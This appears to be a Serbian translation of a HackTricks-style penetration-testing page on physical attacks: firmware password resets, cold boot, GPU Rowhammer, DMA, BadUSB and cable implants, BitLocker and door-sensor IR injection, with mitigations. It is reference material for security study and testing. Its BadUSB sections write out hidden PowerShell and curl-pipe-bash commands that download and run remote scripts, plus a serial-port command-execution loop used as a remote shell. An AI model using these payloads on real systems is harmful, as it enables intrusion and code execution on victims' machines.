# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

## Oporavak BIOS lozinke i bezbednost sistema

Podešavanja firmvera na starijim PC računarima mogu se resetovati isključivanjem CMOS baterije ili korišćenjem dokumentovanog džampera za brisanje CMOS-a. Potrebno vreme bez napajanja zavisi od matične ploče, a lozinke ili ključevi za moderni UEFI mogu se nalaziti u nevolatilnoj fleš memoriji, ugrađenom kontroleru ili bezbednosnom uređaju, pa mogu ostati sačuvani i nakon uklanjanja baterije. Pre spajanja pinova pogledajte priručnik za matičnu ploču ili servisni priručnik; ovaj postupak može i da poništi TPM merenja i pokrene oporavak šifrovanog diska.

Na starijim x86 sistemima, alati kao što su **killCMOS** i **CmosPwd** mogu da pregledaju ili izmene podešavanja sačuvana u CMOS-u iz okruženja za pokretanje. CmosPwd prepoznaje formate lozinki za dokumentovan skup starijih porodica BIOS-a i može da napravi rezervnu kopiju, vrati ili obriše/ukloni stanje CMOS-a; njegove objavljene verzije namenjene su za starija DOS/Windows, Linux, FreeBSD i NetBSD okruženja.<sup>[[18]](#references)</sup> Ovi alati nisu univerzalni alati za uklanjanje UEFI lozinki i zahtevaju dovoljan pristup hardveru/firmveru.

Neki firmveri laptopova prikazuju kod izazova specifičan za proizvođača nakon nekoliko neuspešnih pokušaja unosa lozinke. Baze podataka kao što je [bios-pw.org](https://bios-pw.org) mogu da izračunaju lozinke za oporavak starijih sistema nekih proizvođača, ali mnogi sistemi koriste zaključavanje bez koda izazova iz kog se lozinka može izvesti. Svaku generisanu lozinku smatrajte specifičnom za model i izbegavajte iscrpljivanje brojača pokušaja koji se ne može resetovati.

### UEFI bezbednost

Za moderne **UEFI** sisteme, CHIPSEC može da proveri zaštitu promenljivih Secure Boot-a. Najpre pokrenite proveru koja ništa ne menja; opcioni režim `-a modify` namerno pokušava da ošteti promenljive i treba ga koristiti samo na laboratorijskom sistemu koji se može oporaviti. CHIPSEC sam upozorava da njegov privilegovani drajver i pristup hardveru niskog nivoa nisu pogodni za produkcione krajnje uređaje.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM-a i Cold Boot Attacks

DRAM ne gubi odmah svaki bit čim prestane osvežavanje. Brzina raspadanja podataka znatno varira u zavisnosti od tehnologije modula i temperature; hlađenje može da očuva korisne podatke mnogo duže nego ciklus isključivanja i ponovnog uključivanja bez hlađenja. Cold-boot attack brzo ponovo pokreće sistem u malom okruženju za prikupljanje podataka ili premešta ohlađeni modul, snima sirovu memoriju i rekonstruiše kriptografske ključeve uprkos raspadanju bitova. Uslužni program za kopiranje diska nije automatski alat za snimanje fizičke memorije, a Volatility analizira snimak umesto da ga prikuplja; koristite validiran alat za prikupljanje podataka odgovarajući platformi.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer napadi na tabele stranica

Savremeni GPU Rowhammer napadi postaju mnogo korisniji kada ciljaju **metapodatke virtuelne memorije GPU-a** umesto običnih bafera. Nedavna istraživanja **GDDR6 NVIDIA Ampere GPU-ova** pokazuju da napadaч koji izvršava neprivilegovani CUDA kod može da napravi obrasce hammering-a specifične za GPU, koristi **manipulaciju memorijom** da smesti strukture za straničenje u ranjive redove i zatim preokrene bitove u **tabeli stranica poslednjeg nivoa** ili posrednom **direktorijumu stranica**. Kada se ošteti jedan unos za prevođenje adresa, napadač može da uspostavi **proizvoljno čitanje/upis GPU memorije**, a zatim da pređe na kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Obrazac eksploatacije

1. **Profilisati redove podložne hammering-u** u GDDR6 i napraviti obrasce hammering-a koji uzimaju u obzir osvežavanje/neujednačene obrasce, a zaobilaze mitigacije unutar DRAM-a.
2. **Manipulisati alokacijama GPU-a** tako da upravljački program smesti strukture za prevođenje adresa stranica na fizičke lokacije podložne hammering-u, umesto da ih zadrži u podrazumevanom zaštićenom skupu. U praksi to može da podrazumeva iscrpljivanje oblasti male memorije za tabele stranica i raspršivanje velikih retkih UVM mapiranja sa kontrolisanim koracima.
3. **Preokrenuti metapodatke za prevođenje adresa**, kao što su bitovi **PFN** ili bitovi povezani sa aperturom, unutar unosa tabele stranica/direktorijuma stranica, tako da se virtuelna stranica pod kontrolom napadača mapira na stranice tabela stranica, proizvoljnu GPU memoriju ili sistemska mapiranja vidljiva hostu.
4. Ponovo upotrebiti falsifikovano mapiranje za prepisivanje dodatnih unosa za prevođenje adresa i eskalirati do **proizvoljnog čitanja/upisa GPU memorije** kroz GPU kontekste.

### Prelazak na host i mitigacije

- Kada je **IOMMU onemogućen**, falsifikovana mapiranja sistemske aperture mogu da izlože GPU-u proizvoljnu **fizičku memoriju hosta**, pretvarajući GPU primitiv u potpunu kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja unose tabele stranica poslednjeg nivoa, dok **GeForge** pokazuje da oštećivanje nivoa direktorijuma stranica može biti lakše, jer jedan preokrenuti bit može da preusmeri veće podstablo za prevođenje adresa. Nemojte smatrati samo jedan nivo straničenja ključnim za bezbednost.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan jer blokira direktan put do proizvoljne memorije hosta koji koriste GDDRHammer/GeForge, ali **nije potpuna mitigacija**. **GPUBreach** pokazuje drugi korak prelaska, pri kom napadač oštećuje baferе CPU-a koje može da zapisuje GPU, a koji su u vlasništvu upravljačkog programa, a zatim aktivira greške bezbednosti memorije u NVIDIA upravljačkom programu kako bi dobio primitiv za upis u kernel i **root shell**, čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **ECC na nivou sistema** je praktična mera za ojačavanje bezbednosti na podržanim GPU-ovima za radne stanice/servere. Potrošački GPU-ovi bez ECC-a nude slabiju odbranu.<sup>[[4]](#references)</sup>
- Ovi napadi nisu samo teorijski: **GeForge** je prijavio **1.171** preokret bitova na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izradu funkcionalnog lanca eskalacije privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Napadi direktnim pristupom memoriji (DMA)

Za offline UEFI IFR/NVRAM izmenu koja može da oslabi sprovođenje IOMMU pravila pre pokretanja sistema i omogući Windows DMA lanac, pogledajte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstrira **prikupljanje i izmenu memorije putem DMA-a** preko interfejsa kao što su FireWire i rane Thunderbolt konfiguracije, uključujući istorijske potpise za zaobilaženje prijavljivanja. Nije jednostavno „neefikasan protiv Windows 10“: mogućnost eksploatacije zavisi od interfejsa, verzije sistema, IOMMU pravila, stanja zaključavanja i toga da li je Windows Kernel DMA Protection podržan i omogućen. Windows 10 verzija 1803 i novije uvele su Kernel DMA Protection na kompatibilnim platformama, čime je površina napada znatno izmenjena.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB za pristup sistemu

Na nešifrovanom ili već otključanom Windows volumenu, offline okruženje može da zameni binarne datoteke za pristupačnost, kao što su **sethc.exe** ili **Utilman.exe**, pomoću **cmd.exe**, čime se dobija komandna linija SYSTEM kada se upotrebi odgovarajuća prečica na ekranu za prijavljivanje. Alati kao što je **chntpw** mogu da izmene podatke lokalnog SAM naloga. Ove metode ne zaobilaze zaključan BitLocker volumen i mogu da oštete akreditive zaštićene pomoću DPAPI/EFS; sačuvajte forenzičke kopije i rezervne kopije.

**Kon-Boot** je komercijalni alat za zaobilaženje autentifikacije tokom pokretanja sistema, za podržane Windows/macOS konfiguracije. Kompatibilnost zavisi od operativnog sistema, režima firmvera, Secure Boot-a i podešavanja šifrovanja diska; alat ne dešifruje BitLocker volumen koji je zaključan.<sup>[[10]](#references)</sup>

---

## Rukovanje Windows bezbednosnim funkcijama

### Prečice za pokretanje i oporavak

- **Delete/Supr**, F2, F10 ili neki drugi taster proizvođača može da otvori podešavanja firmvera.
- **F8** otvara zastarele napredne opcije pokretanja sistema Windows samo na konfiguracijama gde je taj put i dalje omogućen; trenutni način ulaska u oporavak varira.
- Držanje tastera **Shift** može da spreči automatsko prijavljivanje u Windows na nekim konfiguracijama, mada podešavanja pravila/registratora mogu da onemoguće takvo ponašanje.<sup>[[17]](#references)</sup>

### BAD USB uređaji

Uređaji kao što su **USB Rubber Ducky** i Teensy ploče mogu da se predstave kao pouzdane HID tastature i unose unapred definisane pritiske tastera. Payload u početku ima privilegije i pristup radnoj površini prijavljene sesije; UAC upiti, zaključavanje ekrana, raspored tastature, vremenska podešavanja i USB pravila krajnje tačke i dalje ga ograničavaju.<sup>[[15]](#references)</sup>

Programabilni periferni uređaji mogu da napadnu i parsere kernela hosta i koordiniraju više USB uređaja za uređivanje heap-a i otkrivanje informacija:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Administratorske ili rezervne privilegije mogu da kreiraju shadow copy ili sačuvaju hive-ove registratora kako bi se preuzeli zaključani fajlovi kao što su **SAM** i **SYSTEM**. Ovo je tehnika prikupljanja podataka nakon kompromitacije, a ne zaobilaženje privilegija; treba je povezati sa događajima `diskshadow`/VSS i izvoza hive-ova registratora.

## BadUSB / HID tehnike implantacije

### Android HID gadget aktiviran NFC-om

Root-ovan Android telefon može da postane programabilna USB tastatura samo kada njegov USB kontroler i kernel podržavaju **USB gadget/HID**. Na kompatibilnim uređajima, Kali NetHunter omogućava profile gadget-a preko **USB Arsenal**. Druga mogućnost je [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), koji kreira gadget funkcije pomoću ConfigFS-a i može da izloži znakovne uređaje tastature/miša, kao što su `/dev/hidg0` i `/dev/hidg1`. Alat samo kreira krajnju tačku gadget-a; zaseban proces mora da joj upisuje HID izveštaje. Root pristup ne može da nadoknadi kernelu nedostatak ConfigFS-a, HID gadget podrške ili upotrebljivog USB Device Controller-a.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ova krajnja tačka može da se kombinuje sa Android NFC-om kao fizičkim okidačem. Aplikacija [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) čita UID oznake, pretvara ga u očekivani oblik, proverava lokalnu belu listu i nakon podudaranja šalje konfigurisani niz tastera u stilu Rubber Ducky-ja. Povezani host prepoznaje običan unos sa tastature i ne zahteva NFC softver.<sup>[[22]](#references)[[24]](#references)</sup>

Pre korišćenja prečica ili komandi, proverite enumeraciju i raspored tastature u praznom tekstualnom editoru. Bezopasan payload je:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Važne granice poverenja:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist je identifikacija, a ne autentifikacija**. UID-ovi su javni, a neki tipovi tokena ili emulatori omogućavaju kloniranje ili lažno predstavljanje. Kopirani dozvoljeni UID prati isti put obrade kao originalni token.
- Magisk modul **NfcScreenOff** zakrpljuje NFC servis tako da se ponaša kao da je ekran uključen i otključan. Ako je telefon već povezan sa hostom, neko može da pokrene payload bez otključavanja telefona.
- Lozinke, API tokeni i komande sačuvani u payload-u predstavljaju tajne koje se mogu oporaviti sa uređaja sa root pristupom ili otključanim bootloader-om. Unošenje lozinke preko HID-a predstavlja automatizaciju ponovne upotrebe lozinke, a ne autentifikaciju bez lozinke.
- HID injection koristi privilegije aktivne desktop sesije i zavisi od fokusa, tajminga i rasporeda tastature hosta. Zahtevajte nedavnu potvrdu korisnika pre izvršavanja osetljivih radnji, izbegavajte čuvanje privilegovanih tajni u skriptama i koristite autentifikator sa kriptografskim challenge-response mehanizmom za stvarnu autentifikaciju.

### Wi-Fi implantati u kablovima

- Implantati zasnovani na ESP32-S3, kao što je **Evil Crow Cable Wind**, kriju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, enumerišu se isključivo kao USB tastatura i preko Wi-Fi mreže izlažu svoj C2 stek. Operater treba samo da napaja kabl preko hosta žrtve, napravi hotspot pod imenom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) da bi pristupio ugrađenom HTTP interfejsu.<sup>[[8]](#references)</sup>
- Veb interfejs sadrži kartice *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payload-i označeni su prema OS-u, rasporedi tastature menjaju se u hodu, a VID/PID stringovi mogu se promeniti tako da oponašaju poznate periferne uređaje.
- Pošto je C2 unutar kabla, telefon može da pripremi payload-e, pokrene njihovo izvršavanje i upravlja Wi-Fi akreditivima bez korišćenja mreže organizacije — korisno za fizičke upade sa kratkim vremenom zadržavanja.

### AutoExec payload-i koji prepoznaju OS

- AutoExec pravila povezuju jedan ili više payload-a koji se pokreću odmah nakon USB enumeracije. Implant vrši jednostavno prepoznavanje OS-a i bira odgovarajuću skriptu.
- Primer toka rada:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, dovoljno je zameniti kabl za punjenje da bi se ostvario početni pristup u kontekstu prijavljenog korisnika — „plug-and-pwn“.

### HID-om pokrenuta udaljena ljuska preko Wi-Fi TCP-a

1. **Početno pokretanje pomoću pritisaka tastera:** Sačuvani payload otvara konzolu i umeće petlju koja izvršava sve što stigne preko novog USB serijskog uređaja. Minimalna Windows varijanta je:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kablovski most:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP klijent (Python skriptu, Android APK ili izvršnu datoteku za desktop) koji se povezuje nazad sa operaterom. Svi bajtovi uneti u TCP sesiju prosleđuju se u gornju serijsku petlju, čime se omogućava daljinsko izvršavanje komandi čak i na hostovima bez mrežne veze. Izlaz je ograničen, pa operateri obično pokreću komande naslepo (kreiranje naloga, priprema dodatnih alata itd.).

### Površina za HTTP OTA ažuriranje

- Dokumentovani interfejs Evil Crow Cable Wind izlaže neautentifikovani endpoint za ažuriranje firmvera na `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operateri na terenu mogu menjati funkcije u hodu (npr. flešovati firmware za USB Army Knife) tokom angažovanja, bez otvaranja kabla, što omogućava implantatu da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker enkripcije

Ovlašćeno forenzičko preuzimanje podataka sa sistema koji je pokrenut ili je nedavno radio može da sadrži BitLocker ključ glavnog volumena ili povezani ključni materijal dok je volumen otključan. Komercijalni alati kao što su Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic mogu da pretražuju podržane memorijske slike, datoteke hibernacije ili crash dump-ove, ali uspeh nije zagarantovan. Savremeni Windows takođe šifruje crash dump-ove kada je BitLocker omogućen, a sačuvana 48-cifrena lozinka za oporavak razlikuje se od ključa volumena koji se nalazi u memoriji.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Socijalni inženjering radi dodavanja ključa za oporavak

Napadač koji ubedi administratora da pokrene komande za upravljanje BitLocker-om može da doda lozinku za oporavak, eksterni ključ ili drugi zaštitni mehanizam, a zatim da ga preuzme. Lozinka za oporavak ne može biti proizvoljan niz nula: numeričke lozinke za oporavak BitLocker-a moraju da budu u validiranom formatu od 48 cifara. Odgovarajuća sintaksa za ovlašćenu administraciju je `manage-bde -protectors -add C: -recoverypassword`; listu dodatih zaštitnih mehanizama možete da prikažete komandom `manage-bde -protectors -get C:`. Nadgledajte dodavanje zaštitnih mehanizama i vodite računa da se novi materijal za oporavak arhivira samo na odobrenim lokacijama.<sup>[[16]](#references)</sup>

---

## Iskorišćavanje prekidača za otvaranje kućišta/održavanje radi vraćanja BIOS-a na fabrička podešavanja

Mnogi savremeni laptopovi i desktop računari malog formata imaju **prekidač za otvaranje kućišta** koji nadgledaju Embedded Controller (EC) i firmware BIOS/UEFI. Iako je osnovna namena prekidača da aktivira upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu prečicu za oporavak** koja se aktivira kada se prekidač uključi i isključi prema određenom obrascu.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Prekidač je povezan sa **GPIO prekidom** na EC-u.
2. Firmware koji radi na EC-u prati **vreme i broj pritisaka**.
3. Kada prepozna unapred definisani obrazac, EC poziva rutinu *mainboard-reset* koja **briše sadržaj sistemskog NVRAM-a/CMOS-a**.
4. Pri sledećem pokretanju, pogođeni modeli učitavaju resetovano stanje firmware-a. U zavisnosti od proizvođača i revizije, obrisano stanje može da obuhvati administratorsku lozinku, prilagođena podešavanja pokretanja ili upisane ključeve Secure Boot-a; stanje TPM-a i posledice po šifrovanje diska treba proceniti zasebno.

> Resetovanje firmware-a može da vrati opcije pokretanja sa spoljnog uređaja, ali **ne** dešifruje skladište podataka. BitLocker ili drugi sistem za šifrovanje celog diska može da zatraži oporavak nakon promena TPM-a/firmware-a, a da pritom i dalje štiti interni disk bez ključa za oporavak.<sup>[[16]](#references)</sup>

### Primer iz prakse – Framework 13 Laptop

Prečica za oporavak za Framework 13 (11./12./13. generacije) glasi:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Posle desetog ciklusa, EC postavlja zastavicu koja nalaže BIOS-u da obriše NVRAM pri sledećem ponovnom pokretanju. Ceo postupak traje oko 40 s i zahteva **samo šrafciger**.<sup>[[5]](#references)</sup>

### Opšti postupak eksploatacije

1. Uključite cilj ili ga probudite iz stanja suspendovanja kako bi EC radio.
2. Skinite donji poklopac da biste otkrili prekidač za detekciju upada/održavanje.
3. Ponovite sekvencu prebacivanja specifičnu za proizvođača (pogledajte dokumentaciju i forume ili izvršite reverse engineering firmvera EC-a).
4. Ponovo sastavite uređaj i pokrenite ga, pa proverite koje su se postavke firmvera i akreditivi zaista promenili.
5. Ako imate ovlašćenje i dostupno je pokretanje sa spoljnog medija, pokrenite kontrolisanu live sliku. Kada se interni volumen legitimno otključa (ili ako nikada nije bio šifrovan), live okruženje može da preuzme akreditive i podatke ili da pregleda EFI System Partition. Izmena te particije radi instaliranja EFI implantata je trajna i veoma invazivna, a i dalje je ograničavaju Secure Boot, measured boot, zaštita od upisivanja u firmver i nadzor krajnjih uređaja. Šifrovanom skladištu nije moguće pristupiti bez ključa ili materijala za oporavak.

### Detekcija i ublažavanje

* Beležite događaje otvaranja kućišta u konzoli za upravljanje OS-om i povežite ih sa neočekivanim resetovanjima BIOS-a.
* Koristite **pečate koji pokazuju pokušaj neovlašćenog otvaranja** na zavrtnjima/poklopcima.
* Čuvajte uređaje u **fizički kontrolisanim prostorima**; pretpostavite da fizički pristup znači potpunu kompromitaciju.
* Gde je moguće, onemogućite opciju proizvođača „maintenance switch reset“ ili zahtevajte dodatno kriptografsko ovlašćenje za resetovanje NVRAM-a.

---

## Prikriveno IR ubrizgavanje u senzore za izlaz bez dodira

### Karakteristike senzora
- Komercijalni senzori „wave-to-exit“ kombinuju near-IR LED emiter sa prijemnim modulom nalik onom u daljinskom upravljaču za TV, koji prijavljuje logičku jedinicu tek pošto detektuje više impulsa (~4–10) odgovarajuće noseće frekvencije (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični štitnik sprečava da emiter i prijemnik budu direktno usmereni jedan ka drugom, pa kontroler pretpostavlja da je svaki validirani noseći signal stigao od obližnjeg odraza i aktivira relej koji otvara električnu bravu vrata.
- Kada kontroler utvrdi da je meta prisutna, često menja modulacionu ovojnicu izlaznog signala, ali prijemnik i dalje prihvata svaki impulsni niz koji odgovara filtriranoj nosećoj frekvenciji.

### Tok napada
1. **Zabeležite profil emisije** – povežite logički analizator sa pinovima kontrolera da biste snimili talasne oblike pre i posle detekcije koji upravljaju internom IR LED diodom.
2. **Ponovite samo talasni oblik „posle detekcije“** – uklonite/ignorišite fabrički emiter i od samog početka pobuđujte spoljnu IR LED diodu već aktiviranim obrascem. Pošto prijemnik prati samo broj i frekvenciju impulsa, smatra da je lažni noseći signal stvarni odraz i aktivira relejnu liniju.
3. **Ograničite prenos** – šaljite noseći signal u podešenim nizovima impulsa (npr. uključeno desetine milisekundi, pa približno isto toliko isključeno) kako biste poslali najmanji potreban broj impulsa, a da ne zasitite AGC prijemnika ili logiku za obradu smetnji. Neprekidno emitovanje brzo smanjuje osetljivost senzora i sprečava aktiviranje releja.

### Ubrizgavanje refleksijom na velikoj udaljenosti
- Zamena LED diode na testnoj ploči snažnom IR diodom, MOSFET drajverom i fokusnom optikom omogućava pouzdano aktiviranje sa udaljenosti od oko 6 m.
- Napadaču nije potrebna optička vidljivost do otvora prijemnika; usmeravanje zraka ka unutrašnjim zidovima, policama ili dovratnicima koji se vide kroz staklo omogućava da reflektovana energija uđe u vidno polje od ~30° i oponaša pokret ruke iz neposredne blizine.
- Pošto prijemnici očekuju samo slabe odraze, mnogo snažniji spoljni zrak može da se odbije od više površina i ipak ostane iznad praga detekcije.

### Modifikovana napadačka baterijska lampa
- Smeštanje drajvera u komercijalnu baterijsku lampu prikriva alat. Zamenite vidljivu LED diodu snažnom IR LED diodom usklađenom sa opsegom prijemnika, dodajte ATtiny412 (ili sličan mikrokontroler) za generisanje impulsa od ≈30 kHz i upotrebite MOSFET za provođenje struje kroz LED diodu.
- Teleskopsko sočivo za zumiranje sužava snop radi većeg dometa/preciznosti, dok vibracioni motor kojim upravlja MCU daje haptičku potvrdu da je modulacija aktivna, bez emitovanja vidljive svetlosti.
- Prebacivanje između nekoliko sačuvanih modulacionih obrazaca (sa blago različitim nosećim frekvencijama i ovojnicama) povećava kompatibilnost sa različitim rebrendiranim porodicama senzora, pa operater može da usmerava snop ka reflektujućim površinama dok relej zvučno ne klikne i vrata se ne otvore.

---

## References

- [1] [GDDRHammer: Znatno ometanje DRAM redova — Rowhammer napadi između komponenti na modernim GPU-ovima](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Ometanje GDDR memorije radi falsifikovanja GPU tabela stranica iz zabave i zarade](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Napadi za eskalaciju privilegija na GPU-ovima pomoću Rowhammer-a](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Bezbednosno obaveštenje: Rowhammer - jul 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Pritisnite ovde da biste preuzeli kontrolu“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Vodič za resetovanje matične ploče](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Neeeeee, ne dodirujte! – Zaobilaženje IR senzora za izlaz bez dodira pomoću prikrivene IR baterijske lampe“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Uključi, pokreni, preuzmi kontrolu: hakovanje pomoću Evil Crow Cable Wind-a“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer napad na NVIDIA čipove](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Zvanična dokumentacija Kon-Boot-a i informacije o kompatibilnosti](https://kon-boot.com/)
- [11] [CHIPSEC dokumentacija - Zaštita Secure Boot promenljivih](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Da ne zaboravimo: Cold Boot napadi na ključeve za šifrovanje](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Manipulacija fizičkom memorijom preko DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Zaštita kernela od DMA napada](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacija Hak5 USB Rubber Ducky-ja](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Vodič za BitLocker operacije](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - ponašanje držanja tastera Shift i automatskog prijavljivanja](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Dokumentacija i preuzimanja za CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux dokumentacija - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Dokumentacija Linux kernela - USB HID gadget drajver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Pretvorite rutovani Android telefon u NFC autentifikator i alat za automatizaciju računara](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
